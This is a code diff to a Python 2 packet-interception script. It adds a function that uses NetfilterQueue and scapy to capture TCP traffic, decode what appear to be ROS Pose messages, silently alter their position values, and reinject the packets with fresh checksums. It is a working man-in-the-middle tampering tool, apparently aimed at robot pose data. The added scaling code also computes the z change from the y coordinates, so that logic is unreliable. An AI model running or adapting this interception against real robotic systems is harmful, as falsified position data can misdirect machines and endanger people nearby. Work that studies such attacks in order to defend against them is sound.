@@ -344,11 +344,117 @@ def drop(packet):
         print 'except'
         packet.accept()
 
+previous_pose = None
+
+def print_diff(current_pose):
+    global previous_pose
+
+    if previous_pose is None:
+        previous_pose = current_pose
+        return
+
+    p_pos = previous_pose.position
+    p_ori = previous_pose.orientation
+
+    c_pos = current_pose.position
+    c_ori = current_pose.orientation
+
+    print 'p_dx : {0:20.15f} o_dx {1:20.15f}'.format(c_pos.x-p_pos.x,c_ori.x-p_ori.x)
+    print 'p_dy : {0:20.15f} o_dy {1:20.15f}'.format(c_pos.y-p_pos.y,c_ori.y-p_ori.y)
+    print 'p_dz : {0:20.15f} o_dz {1:20.15f}'.format(c_pos.z-p_pos.z,c_ori.z-p_ori.z)
+    print 'p_dw : {0} o_dw {1:20.15f}'.format(20*' ',c_ori.w-p_ori.w)
+
+    scale(current_pose)
+    previous_pose = current_pose
+
+    
+
+def scale(current_pose):
+    global previous_pose
+
+    p_pos = previous_pose.position
+    p_ori = previous_pose.orientation
+
+    c_pos = current_pose.position
+    c_ori = current_pose.orientation
+
+    dx = c_pos.x-p_pos.x
+    dy = c_pos.y-p_pos.y
+    dz = c_pos.y-p_pos.y
+
+    offset = 0.00001
+
+    factor = 1.0
+
+    print (offset if dx != 0 else 0.0)
+    c_pos.x = p_pos.x + factor*dx + (offset if dx != 0 else 0.0)
+    c_pos.y = p_pos.y + factor*dy + (offset if dy != 0 else 0.0)
+    c_pos.z = p_pos.z + factor*dz + (offset if dz != 0 else 0.0)
+
+
+
+
+def  pose_manipulator(packet):
+    try:
+        #pkt = packet 
+        #print "---inside---"
+        pkt = IP(packet.get_payload())
+        if not(Raw in pkt and TCP in pkt):
+            packet.accept()
+            return
+        init_len = len(str(pkt))
+
+        b = StringIO()
+        b.write(pkt[Raw].load)
+
+        
+        print 'initial len -> %d '%len(str(pkt))
+        
+        b.seek(0)
+        (size,) = struct.unpack('<I', b.read(4))
+        msg = Pose()
+        b.seek(4)
+        print 'size -> %s'%(size)
+        print type(b.read(size))
+        b.seek(4)
+        msg.deserialize(b.read(size))
+        """
+        with open('_log_transmission.txt','w') as f:
+            print msg.encode('utf-16')
+            f.write(msg.encode('utf8'))
+        """
+        print "current msg -> \n%s"%msg
+        print "len " + str(len(str(msg)))
+        print 'final len -> %d'%len(str(pkt))
+
+        print_diff(msg)
+
+        print 'modified -> \n%s'%msg
+        
+        b.seek(4)
+        
+        msg.serialize(b)
+        b.seek(0)
+        data = b.read(size+4)
+        
+ 
+        del pkt[IP].chksum
+        del pkt[TCP].chksum
+
+        pkt[Raw].load = data
+        packet.set_payload(bytes(pkt))
+        
+
+        packet.accept()
+    except:
+        print 'except'
+        packet.accept()
+
 
 def main():
     nfqueue = NetfilterQueue()
    
-    nfqueue.bind(1, random_modify) 
+    nfqueue.bind(1, pose_manipulator) 
     try:
         print "[*] waiting for data"
         nfqueue.run()
